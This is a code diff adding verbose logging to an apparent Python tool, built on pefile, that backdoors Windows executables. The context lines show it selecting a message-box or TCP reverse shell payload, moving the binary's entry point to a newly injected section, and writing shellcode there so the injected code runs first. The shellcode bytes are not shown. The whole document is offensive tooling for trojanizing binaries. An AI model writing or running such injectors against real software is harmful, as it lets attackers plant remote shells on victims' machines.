@@ -1,4 +1,5 @@
 import pefile
+from config import VERBOSE
 import utilities
 
 
@@ -73,8 +74,17 @@ def reverse_shell(lhost=None):
 
 def payload_selection(payload, *args, **kwargs):
     if payload in 'msgbox':
+        if VERBOSE:
+            print("Selecting Message Box Shellcode\n")
         return msgbox()
     elif payload in 'reverse':
+        if VERBOSE:
+            print("Selecting Windows TCP Reverse Shell Shellcode")
+            for k, v in kwargs.items():
+                print(f"\tAdditional Argument: {k}={v}")
+            for a in args:
+                print(f"\tAdditional Argument: {a}")
+            print()
         return reverse_shell(*args, **kwargs)
 
 
@@ -84,6 +94,8 @@ def insert_payload(path, payload, *args, **kwargs):
 
     # We will first change the binaries entry point to be the newly injected section
     # this will run our injected code first
+    if VERBOSE:
+        print(f"Modifying Entry Point\n")
     pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[-1].VirtualAddress
 
     # Now we have to actually load the payload into the binary
@@ -92,8 +104,12 @@ def insert_payload(path, payload, *args, **kwargs):
 
     # Write the shellcode into the new section
     shellcode = payload_selection(payload, *args, **kwargs)
+
+    if VERBOSE:
+        print(f"Writing shellcode to {hex(raw_offset)}\n")
     pe.set_bytes_at_offset(raw_offset, shellcode)
     pe.write(path)
+    print("[x] Payload injected\n")
 
 
 if __name__ == "__main__":
